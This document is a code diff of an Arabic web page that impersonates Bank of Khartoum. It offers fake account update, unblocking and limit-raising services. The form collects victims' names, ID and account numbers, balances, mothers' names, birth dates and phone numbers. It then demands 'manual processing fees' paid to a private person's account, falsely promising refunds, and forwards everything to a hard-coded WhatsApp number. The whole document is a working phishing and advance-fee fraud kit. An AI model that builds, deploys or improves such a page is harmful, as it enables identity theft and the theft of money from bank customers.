@@ -2,200 +2,209 @@
 <html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>بنك الخرطوم - تحديث البيانات</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>بنك الخرطوم - خدمات المعالجة اليدوية</title>
     
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@400;600;700&display=swap" rel="stylesheet">
     
     <style>
-        :root { --bok-red: #C1272D; --bok-gray: #58595B; --bok-text: #231F20; --bok-input-border: #D1D3D4; }
-        body { font-family: 'Cairo', sans-serif; background-color: #FFFFFF; color: var(--bok-text); margin: 0; padding: 0; }
-        .page-header { background-color: var(--bok-red); color: #FFFFFF; padding: 15px 20px; width: 100%; display: flex; align-items: center; justify-content: space-between; position: fixed; top: 0; left: 0; z-index: 1000; }
-        .main-content { margin-top: 80px; padding: 20px; }
-        .bok-input { width: 100%; padding: 12px 15px; border: 1px solid var(--bok-input-border); border-radius: 8px; font-size: 14px; outline: none; transition: border-color 0.2s; }
+        :root { --bok-red: #C1272D; --bok-gold: #c6a357; --bok-text: #231F20; --bok-input-border: #D1D3D4; }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Cairo', sans-serif; background-color: #FFFFFF; color: var(--bok-text); overflow-x: hidden; width: 100%; }
+        
+        /* الواجهة الرئيسية */
+        .landing-container { position: relative; width: 100%; display: flex; flex-direction: column; cursor: pointer; }
+        .main-img { width: 100%; height: auto; display: block; border: none; }
+        .smart-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0); z-index: 50; }
+        .bok-btn-gold { background-color: var(--bok-gold); color: white; padding: 22px 10px; font-weight: bold; width: 100%; display: block; font-size: 17px; border: none; cursor: pointer; }
+
+        /* الهيدر */
+        .page-header { 
+            background-color: var(--bok-red); color: #FFFFFF; padding: 15px 20px; width: 100%; 
+            display: flex; align-items: center; justify-content: space-between; 
+            position: fixed; top: 0; left: 0; z-index: 1000;
+        }
+
+        .main-content { margin-top: 80px; padding: 20px; width: 100%; max-width: 550px; margin-left: auto; margin-right: auto; min-height: 70vh; }
+        
+        .bok-input { width: 100%; padding: 14px 15px; border: 1px solid var(--bok-input-border); border-radius: 8px; font-size: 14px; outline: none; text-align: right; margin-bottom: 15px; display: block; }
         .bok-input:focus { border-color: var(--bok-red); }
-        .bok-btn-primary { background-color: var(--bok-red); color: #FFFFFF; font-weight: 700; padding: 12px 20px; border-radius: 8px; width: 100%; cursor: pointer; border: none; font-size: 16px; }
+        .bok-btn-primary { background-color: var(--bok-red); color: #FFFFFF; font-weight: 700; padding: 14px 20px; border-radius: 8px; width: 100%; cursor: pointer; border: none; font-size: 16px; }
+        
         .step-container { display: none; }
         .step-container.active { display: block; }
-        .service-card { border: 2px solid #f3f4f6; transition: all 0.3s; cursor: pointer; border-radius: 12px; }
+        .service-card { border: 2px solid #f3f4f6; transition: all 0.3s; cursor: pointer; border-radius: 12px; border-right: 6px solid var(--bok-red); margin-bottom: 15px; }
+        .hidden-section { display: none; }
+
+        .footer-credits { text-align: center; padding: 25px 10px; background-color: #fff; width: 100%; }
+        .footer-credits p { font-size: 13px; color: #666; margin-bottom: 4px; }
+        .footer-credits .design-firm { font-size: 16px; color: #000; font-weight: 800; letter-spacing: 0.5px; text-transform: uppercase; }
     </style>
 </head>
 <body>
 
-    <header class="page-header">
-        <h1 class="page-title" id="header-title">تحديث بيانات حسابي</h1>
-        <div class="flex gap-4 text-lg">
-            <i class="fas fa-ellipsis-v"></i>
-            <i class="fas fa-arrow-left" onclick="location.reload()" style="cursor: pointer;"></i>
+    <div id="landing-page">
+        <div class="landing-container" onclick="openApp()">
+            <img src="Main_bg.jpg" alt="بنك الخرطوم" class="main-img">
+            <div class="smart-overlay"></div>
+            <button class="bok-btn-gold">المتابعة إلى قسم التحديثات والمعالجة اليدوية ←</button>
         </div>
-    </header>
+        <footer class="footer-credits">
+            <p>© 2026 بنك الخرطوم السودان</p>
+            <div class="design-firm">Designed & Developed by THE DESIGN FIRM</div>
+        </footer>
+    </div>
 
-    <main class="main-content" id="main-ui">
-        <div class="text-center">
-            <img src="bank_logo.png" alt="شعار بنك الخرطوم" class="mx-auto my-6" style="max-width: 250px;">
-        </div>
+    <div id="main-app" class="hidden-section">
+        <header class="page-header">
+            <div class="flex items-center gap-3" onclick="goBack()" style="cursor: pointer;">
+                <i class="fas fa-arrow-right text-xl"></i>
+                <h1 class="font-bold text-lg" id="header-title">تحديث بيانات حسابي</h1>
+            </div>
+            <i class="fas fa-ellipsis-v text-lg"></i>
+        </header>
 
-        <div id="stepper" class="flex items-center justify-center mb-8 gap-2 hidden">
-            <div id="p1" class="w-10 h-10 rounded-full bg-bok-red text-white flex items-center justify-center font-bold shadow-md">1</div>
-            <div id="l1" class="flex-1 h-1 bg-gray-200" style="max-width: 50px;"></div>
-            <div id="p2" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">2</div>
-            <div id="l2" class="flex-1 h-1 bg-gray-200" style="max-width: 50px;"></div>
-            <div id="p3" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">3</div>
-        </div>
-
-        <form id="mainForm" onsubmit="return false;">
-            
-            <div class="step-container active" id="step0">
-                <h2 class="text-center font-bold text-xl mb-6">اختر نوع الخدمة:</h2>
-                <div class="space-y-4">
-                    <div onclick="selectService('update')" class="service-card p-4 flex items-center gap-4">
-                        <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-user-edit text-xl"></i></div>
-                        <div>
-                            <p class="font-bold">تحديث بيانات بنكك</p>
-                            <p class="text-xs text-gray-500">تحديث الرقم المرجعي والمعلومات الشخصية</p>
-                        </div>
-                    </div>
-                    <div onclick="selectService('unblock')" class="service-card p-4 flex items-center gap-4">
-                        <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-unlock-alt text-xl"></i></div>
-                        <div>
-                            <p class="font-bold">حل مشكلة الحساب المحظور</p>
-                            <p class="text-xs text-gray-500">فك حظر الحساب فوراً ومعالجة يدوية</p>
-                        </div>
-                    </div>
-                    <div onclick="selectService('limit')" class="service-card p-4 flex items-center gap-4">
-                        <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-chart-line text-xl"></i></div>
-                        <div>
-                            <p class="font-bold">خدمات رفع سقف التحويل</p>
-                            <p class="text-xs text-gray-500">رفع سقف التحويل اليومي إلى 30 مليون ج.س</p>
-                        </div>
-                    </div>
-                </div>
+        <main class="main-content" id="app-body">
+            <div id="stepper" class="flex items-center justify-center mb-10 gap-2">
+                <div id="p3" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">3</div>
+                <div class="flex-1 h-1 bg-gray-200" id="l2"></div>
+                <div id="p2" class="w-10 h-10 rounded-full bg-gray-200 text-gray-500 flex items-center justify-center font-bold">2</div>
+                <div class="flex-1 h-1 bg-gray-200" id="l1"></div>
+                <div id="p1" class="w-10 h-10 rounded-full bg-bok-red text-white flex items-center justify-center font-bold shadow-md">1</div>
             </div>
 
-            <div class="step-container" id="step1">
-                <div class="space-y-5">
-                    <div id="limit_info_box" class="hidden bg-blue-50 p-3 rounded-lg border border-blue-200 text-sm text-blue-800 text-center">
+            <form id="mainForm" onsubmit="return false;">
+                <div class="step-container active" id="step0">
+                    <h2 class="text-center font-bold text-xl mb-8">اختر نوع الخدمة:</h2>
+                    <div class="space-y-4">
+                        
+                        <div onclick="selectService('update')" class="service-card p-5 flex items-center gap-4">
+                            <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-user-edit text-xl"></i></div>
+                            <div>
+                                <div class="font-bold">تحديث بيانات بنكك</div>
+                                <div class="text-[11px] text-gray-500 mt-1">تحديث الرقم المرجعي، معلومات الهوية، وتنشيط الحسابات الراكدة.</div>
+                            </div>
+                        </div>
+
+                        <div onclick="selectService('unblock')" class="service-card p-5 flex items-center gap-4">
+                            <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-unlock-alt text-xl"></i></div>
+                            <div>
+                                <div class="font-bold">طلب تفعيل حساب محظور</div>
+                                <div class="text-[11px] text-gray-500 mt-1">معالجة فورية لفك الحظر عن الحسابات المقيدة لأسباب أمنية أو فنية.</div>
+                            </div>
+                        </div>
+
+                        <div onclick="selectService('limit')" class="service-card p-5 flex items-center gap-4">
+                            <div class="bg-red-100 p-3 rounded-full text-bok-red"><i class="fas fa-chart-line text-xl"></i></div>
+                            <div>
+                                <div class="font-bold">خدمات رفع سقف التحويل</div>
+                                <div class="text-[11px] text-gray-500 mt-1">زيادة الحد اليومي للتحويل عبر تطبيق بنكك لتلبية احتياجاتك المالية.</div>
+                            </div>
+                        </div>
+
+                    </div>
+                </div>
+
+                <div class="step-container" id="step1">
+                    <div id="limit_info_box" class="hidden bg-blue-50 p-4 rounded-lg border border-blue-200 text-sm text-blue-800 text-center mb-6">
                         سيتم رفع سقف التحويل اليومي لحسابكم إلى <b>30,000,000 ج.س</b> فور اكتمال الطلب.
                     </div>
-
-                    <input type="text" id="full_name" placeholder="الاسم رباعي كما في الهوية" class="bok-input" required>
+                    <input type="text" id="full_name" placeholder="الاسم رباعي كما في الهوية" class="bok-input">
                     
-                    <div id="update_fields" class="hidden space-y-5">
+                    <div id="update_fields" class="hidden">
                         <input type="text" id="id_number" placeholder="رقم الهوية (وطني / جواز / بطاقة)" class="bok-input">
-                        <input type="text" id="ref_number" placeholder="الرقم المرجعي (Reference Number)" class="bok-input text-left" dir="ltr">
+                        <input type="text" id="ref_number" placeholder="الرقم المرجعي (Ref Number)" class="bok-input text-left" dir="ltr">
                     </div>
-
-                    <div id="unblock_fields" class="hidden space-y-5">
+                    
+                    <div id="unblock_fields" class="hidden">
                         <input type="text" id="acc_number" placeholder="رقم الحساب الشخصي" class="bok-input text-left" dir="ltr">
                         <input type="text" id="branch" placeholder="فرع فتح الحساب" class="bok-input">
                         <input type="text" id="balance" placeholder="المبلغ الموجود في الحساب" class="bok-input">
                     </div>
 
-                    <div id="limit_fields" class="hidden space-y-5">
+                    <div id="limit_fields" class="hidden">
                         <input type="text" id="doc_number" placeholder="رقم المستند (جواز / بطاقة / رقم وطني)" class="bok-input">
                         <input type="text" id="job" placeholder="المهنة الحالية" class="bok-input">
                     </div>
+                    <button type="button" onclick="goToStep(2)" class="bok-btn-primary mt-6 shadow-lg">التالي</button>
                 </div>
-                <button type="button" onclick="goToStep(2)" class="bok-btn-primary mt-10 shadow-lg">التالي</button>
-            </div>
 
-            <div class="step-container" id="step2">
-                <div class="space-y-5">
-                    <input type="text" id="mother_name" placeholder="إسم الوالدة بالكامل" class="bok-input" required>
-                    <input type="text" id="address" placeholder="عنوان السكن الحالي" class="bok-input" required>
-                    <div>
-                        <input type="text" id="dob" placeholder="تاريخ الميلاد (مثال: 1990/01/01)" class="bok-input text-left" dir="ltr" required>
-                        <p class="text-[10px] text-gray-400 mt-1 mr-1 text-right">يرجى إدخال التاريخ يدوياً (يوم/شهر/سنة)</p>
-                    </div>
-                    <input type="tel" id="phone_linked" placeholder="رقم الهاتف المرتبط بالحساب (واتساب)" class="bok-input text-left" dir="ltr" required>
-                    
+                <div class="step-container" id="step2">
+                    <input type="text" id="mother_name" placeholder="إسم الوالدة بالكامل" class="bok-input">
+                    <input type="text" id="address" placeholder="عنوان السكن الحالي" class="bok-input">
+                    <input type="text" id="dob" placeholder="تاريخ الميلاد (يوم/شهر/سنة)" class="bok-input text-left" dir="ltr">
+                    <input type="tel" id="phone_linked" placeholder="رقم الهاتف المرتبط (واتساب)" class="bok-input text-left" dir="ltr">
                     <div id="unblock_date_container" class="hidden">
                         <input type="text" id="block_date" placeholder="تاريخ حظر الحساب" class="bok-input text-left" dir="ltr">
                     </div>
-
-                    <div id="limit_step2_fields" class="hidden space-y-5">
-                        <input type="text" id="limit_acc_num" placeholder="رقم الحساب المراد رفع سقفه" class="bok-input text-left" dir="ltr">
-                        <select id="acc_type" class="bok-input">
-                            <option value="">-- اختر نوع الحساب --</option>
-                            <option value="توفير">توفير</option>
-                            <option value="توفير مميز">توفير مميز</option>
-                            <option value="حساب بإسم عمل">حساب بإسم عمل</option>
-                        </select>
-                        <input type="text" id="limit_branch" placeholder="فرع الحساب" class="bok-input">
-                        <textarea id="last_trans" placeholder="آخر 3 تحويلات صادرة من الحساب (المبالغ والتواريخ)" class="bok-input h-24"></textarea>
+                    <div class="flex gap-3 mt-6">
+                        <button type="button" onclick="goToStep(1)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">السابق</button>
+                        <button type="button" onclick="goToStep(3)" class="w-2/3 bok-btn-primary shadow-lg">التالي</button>
                     </div>
                 </div>
-                <div class="flex gap-3 mt-10">
-                    <button type="button" onclick="goToStep(1)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">السابق</button>
-                    <button type="button" onclick="goToStep(3)" class="w-2/3 bok-btn-primary shadow-lg">التالي</button>
-                </div>
-            </div>
 
-            <div class="step-container" id="step3">
-                <div class="space-y-5">
-                    <div class="bg-red-50 p-4 border-r-4 border-red-600 mb-4 text-right">
-                        <p class="text-sm font-bold text-red-800">تنبيه المعالجة اليدوية:</p>
-                        <div id="fee_text_update" class="hidden text-xs text-red-700 leading-relaxed">
-                            بسبب ضغط الطلبات، يتم دفع رسوم رمزية بقيمة <b>99,000 ج.س</b> مقابل معالجة طلبك يدوياً. سيتم خصم 5,000 ج.س فقط، وإعادة المبلغ المتبقي (94,000 ج.س) في حسابكم فوراً.
-                        </div>
-                        <div id="fee_text_unblock" class="hidden text-xs text-red-700 leading-relaxed">
-                            بسبب ضغط الطلبات، يتم دفع رسوم معالجة يدوية بقيمة <b>299,000 ج.س</b> لضمان فك الحظر خلال 24 ساعة. سيتم خصم 15,000 ج.س رسوم إجرائية، وإعادة 284,000 ج.س لحسابكم فوراً.
-                        </div>
-                        <div id="fee_text_limit" class="hidden text-xs text-red-700 leading-relaxed">
-                            بسبب ضغط الطلبات، يتم دفع رسوم معالجة يدوية بقيمة <b>500,000 ج.س</b> مقابل تنفيذ طلب رفع السقف. سيتم خصم 15,000 ج.س طرف البنك، وإعادة المبلغ المتبقي (485,000 ج.س) في حسابكم فوراً.
-                        </div>
+                <div class="step-container" id="step3">
+                    <div class="bg-red-50 p-4 border-r-4 border-red-600 mb-6 text-right text-[11px] text-red-700 leading-relaxed">
+                        <p class="text-sm font-bold text-red-800 mb-1">تنبيه المعالجة اليدوية:</p>
+                        <div id="fee_text_update" class="hidden">بسبب ضغط الطلبات، يتم دفع رسوم رمزية بقيمة <b>99,000 ج.س</b> مقابل معالجة طلبك يدوياً. سيتم خصم 5,000 ج.س فقط، وإعادة المتبقي (94,000 ج.س) في حسابكم فوراً.</div>
+                        <div id="fee_text_unblock" class="hidden">بسبب ضغط الطلبات، يتم دفع رسوم معالجة يدوية بقيمة <b>299,000 ج.س</b> لضمان فك الحظر خلال 24 ساعة. سيتم خصم 15,000 ج.س رسوم إجرائية، وإعادة المتبقي (284,000 ج.س) لحسابكم فوراً.</div>
+                        <div id="fee_text_limit" class="hidden">بسبب ضغط الطلبات، يتم دفع رسوم معالجة يدوية بقيمة <b>500,000 ج.س</b> مقابل تنفيذ طلب رفع السقف. سيتم خصم 15,000 ج.س طرف البنك، وإعادة المتبقي (485,000 ج.س) في حسابكم فوراً.</div>
                     </div>
 
-                    <div class="bg-gray-50 p-5 rounded-lg border border-dashed text-center">
+                    <div class="bg-gray-50 p-6 rounded-lg border border-dashed text-center mb-6">
                         <p class="text-xs text-gray-400 mb-2">رقم حساب تحويل الرسوم (بنكك):</p>
-                        <p class="text-2xl font-bold text-bok-red tracking-wider">2938747</p>
-                        <p class="text-xs text-gray-500 mt-1">بإسم: إلهام الطيب احمد إبراهيم</p>
+                        <p class="text-3xl font-bold text-bok-red tracking-widest">2938747</p>
+                        <p class="text-xs text-gray-600 mt-2 font-bold">بإسم: إلهام الطيب احمد إبراهيم</p>
                     </div>
 
-                    <input type="text" id="transaction_id" placeholder="رقم العملية (من إشعار التحويل)" class="bok-input text-center font-bold text-lg border-2" required>
-                </div>
-                <div class="flex gap-3 mt-10">
-                    <button type="button" onclick="goToStep(2)" class="w-1/3 py-3 border border-gray-300 rounded-lg text-gray-600 font-bold">تعديل</button>
-                    <button type="button" onclick="sendToWhatsApp()" class="w-2/3 bg-green-600 text-white font-bold py-3 rounded-lg flex items-center justify-center gap-2 shadow-xl hover:bg-green-700">
-                        <i class="fab fa-whatsapp text-2xl"></i> تأكيد وإرسال
+                    <input type="text" id="transaction_id" placeholder="رقم العملية من الإشعار" class="bok-input text-center font-bold text-lg border-2 border-red-200">
+                    <button type="button" onclick="sendToWhatsApp()" class="w-full bg-green-600 text-white font-bold py-4 rounded-lg mt-6 flex items-center justify-center gap-3 shadow-xl">
+                        <i class="fab fa-whatsapp text-2xl"></i> تأكيد وإرسال عبر واتساب
                     </button>
                 </div>
-            </div>
-        </form>
-    </main>
+            </form>
 
-    <footer class="mt-12 text-center text-[12px] text-gray-400 border-t pt-4 font-bold">
-        جميع الحقوق محفوظة بنك الخرطوم
-    </footer>
+            <footer class="footer-credits">
+                <p>© 2026 بنك الخرطوم السودان</p>
+                <div class="design-firm">Designed & Developed by THE DESIGN FIRM</div>
+            </footer>
+        </main>
+    </div>
 
     <script>
         const MY_WHATSAPP = "249960724630"; 
         let selectedService = '';
+        let currentStep = 0;
+
+        function openApp() {
+            document.getElementById('landing-page').style.display = 'none';
+            document.getElementById('main-app').classList.remove('hidden-section');
+            currentStep = 0;
+            window.scrollTo(0, 0);
+        }
+
+        function goBack() {
+            if (currentStep === 0) {
+                document.getElementById('main-app').classList.add('hidden-section');
+                document.getElementById('landing-page').style.display = 'block';
+            } else {
+                currentStep--;
+                showStep(currentStep);
+            }
+        }
 
         function selectService(service) {
             selectedService = service;
-            document.getElementById('step0').classList.remove('active');
-            document.getElementById('stepper').classList.remove('hidden');
-            document.getElementById('step1').classList.add('active');
-            
-            document.getElementById('update_fields').classList.add('hidden');
-            document.getElementById('unblock_fields').classList.add('hidden');
-            document.getElementById('limit_fields').classList.add('hidden');
-            document.getElementById('limit_info_box').classList.add('hidden');
-            document.getElementById('unblock_date_container').classList.add('hidden');
-            document.getElementById('limit_step2_fields').classList.add('hidden');
-            document.getElementById('fee_text_update').classList.add('hidden');
-            document.getElementById('fee_text_unblock').classList.add('hidden');
-            document.getElementById('fee_text_limit').classList.add('hidden');
+            document.querySelectorAll('[id^="fee_text_"], #update_fields, #unblock_fields, #limit_fields, #limit_info_box, #unblock_date_container').forEach(el => el.classList.add('hidden'));
 
             if(service === 'update') {
                 document.getElementById('header-title').innerText = "تحديث بيانات بنكك";
                 document.getElementById('update_fields').classList.remove('hidden');
                 document.getElementById('fee_text_update').classList.remove('hidden');
             } else if(service === 'unblock') {
-                document.getElementById('header-title').innerText = "حل مشكلة الحساب المحظور";
+                document.getElementById('header-title').innerText = "طلب تفعيل حساب محظور";
                 document.getElementById('unblock_fields').classList.remove('hidden');
                 document.getElementById('unblock_date_container').classList.remove('hidden');
                 document.getElementById('fee_text_unblock').classList.remove('hidden');
@@ -203,20 +212,29 @@
                 document.getElementById('header-title').innerText = "رفع سقف الحساب";
                 document.getElementById('limit_info_box').classList.remove('hidden');
                 document.getElementById('limit_fields').classList.remove('hidden');
-                document.getElementById('limit_step2_fields').classList.remove('hidden');
                 document.getElementById('fee_text_limit').classList.remove('hidden');
             }
+            goToStep(1);
         }
 
         function goToStep(step) {
+            currentStep = step;
+            showStep(step);
+        }
+
+        function showStep(step) {
             document.querySelectorAll('.step-container').forEach(s => s.classList.remove('active'));
             document.getElementById('step' + step).classList.add('active');
+            
             const p2 = document.getElementById('p2'), p3 = document.getElementById('p3');
             const l1 = document.getElementById('l1'), l2 = document.getElementById('l2');
+
             if (step >= 2) { p2.classList.add('bg-bok-red', 'text-white'); l1.classList.add('bg-bok-red'); }
-            else { p2.classList.replace('bg-bok-red', 'bg-gray-200'); l1.classList.remove('bg-bok-red'); }
+            else { p2.classList.remove('bg-bok-red', 'text-white'); l1.classList.remove('bg-bok-red'); }
+
             if (step === 3) { p3.classList.add('bg-bok-red', 'text-white'); l2.classList.add('bg-bok-red'); }
-            else { p3.classList.replace('bg-bok-red', 'bg-gray-200'); l2.classList.remove('bg-bok-red'); }
+            else { p3.classList.remove('bg-bok-red', 'text-white'); l2.classList.remove('bg-bok-red'); }
+            
             window.scrollTo(0, 0);
         }
 
@@ -229,43 +247,28 @@
             const address = document.getElementById('address').value;
             
             if (!transId) { alert("يرجى إدخال رقم العملية"); return; }
-
+            
             let message = "";
             if (selectedService === 'update') {
                 const ref = document.getElementById('ref_number').value;
-                message = `*طلب تحديث بيانات بنكك*%0A` +
-                          `--------------------------%0A` +
-                          `*الاسم:* ${name}%0A*المرجعي:* ${ref}%0A*رقم الحساب:* ${phone}%0A*رقم العملية:* ${transId}%0A` +
-                          `--------------------------%0A` +
-                          `تم سداد مبلغ 99,000 ج.س (معالجة يدوية وفورية).`;
+                message = `*طلب تحديث بيانات بنكك*%0A--------------------------%0A*الاسم:* ${name}%0A*المرجعي:* ${ref}%0A*رقم الحساب:* ${phone}%0A*رقم العملية:* ${transId}%0A--------------------------%0Aتم سداد مبلغ 99,000 ج.س (معالجة يدوية وفورية).`;
             } else if (selectedService === 'unblock') {
                 const acc = document.getElementById('acc_number').value;
                 const branch = document.getElementById('branch').value;
                 const balance = document.getElementById('balance').value;
-                message = `*طلب فك حظر حساب بنكك*%0A` +
-                          `--------------------------%0A` +
-                          `*الاسم:* ${name}%0A*رقم الحساب:* ${acc}%0A*اسم الوالدة:* ${mother}%0A*السكن:* ${address}%0A*واتساب:* ${phone}%0A*رقم العملية:* ${transId}%0A*الفرع:* ${branch}%0A*الرصيد التقريبي:* ${balance}%0A*تاريخ الحظر:* ${document.getElementById('block_date').value}%0A` +
-                          `--------------------------%0A` +
-                          `تم سداد مبلغ 299,000 ج.س رسوم معالجة يدوية%0Aو ارغب في بدء الإجراءات`;
+                message = `*طلب تفعيل حساب محظور*%0A--------------------------%0A*الاسم:* ${name}%0A*رقم الحساب:* ${acc}%0A*الفرع:* ${branch}%0A*الرصيد:* ${balance}%0A*رقم العملية:* ${transId}%0A--------------------------%0Aتم سداد مبلغ 299,000 ج.س رسوم معالجة يدوية%0Aو ارغب في بدء الإجراءات`;
             } else if (selectedService === 'limit') {
                 const doc = document.getElementById('doc_number').value;
                 const job = document.getElementById('job').value;
-                const limitAcc = document.getElementById('limit_acc_num').value;
-                const type = document.getElementById('acc_type').value;
-                const branch = document.getElementById('limit_branch').value;
-                const lastTrans = document.getElementById('last_trans').value;
-                
-                message = `*طلب رفع سقف التحويل (30 مليون)*%0A` +
-                          `--------------------------%0A` +
-                          `*الاسم:* ${name}%0A*اسم الوالدة:* ${mother}%0A*تاريخ الميلاد:* ${dob}%0A*رقم المستند:* ${doc}%0A*المهنة:* ${job}%0A` +
-                          `*رقم الحساب:* ${limitAcc}%0A*نوع الحساب:* ${type}%0A*الفرع:* ${branch}%0A` +
-                          `*آخر التحويلات:* ${lastTrans}%0A*رقم العملية:* ${transId}%0A` +
-                          `--------------------------%0A` +
-                          `تم سداد مبلغ 500,000 ج.س رسوم معالجة يدوية.`;
+                message = `*طلب رفع سقف التحويل (30 مليون)*%0A--------------------------%0A*الاسم:* ${name}%0A*اسم الوالدة:* ${mother}%0A*تاريخ الميلاد:* ${dob}%0A*رقم المستند:* ${doc}%0A*المهنة:* ${job}%0A*رقم العملية:* ${transId}%0A--------------------------%0Aتم سداد مبلغ 500,000 ج.س رسوم معالجة يدوية.`;
             }
 
             window.open(`https://wa.me/${MY_WHATSAPP}?text=${message}`, '_blank');
-            setTimeout(() => { location.reload(); }, 1000);
+            
+            setTimeout(() => { 
+                alert("تم إرسال طلبك بنجاح.");
+                location.reload(); 
+            }, 1000);
         }
     </script>
 </body>
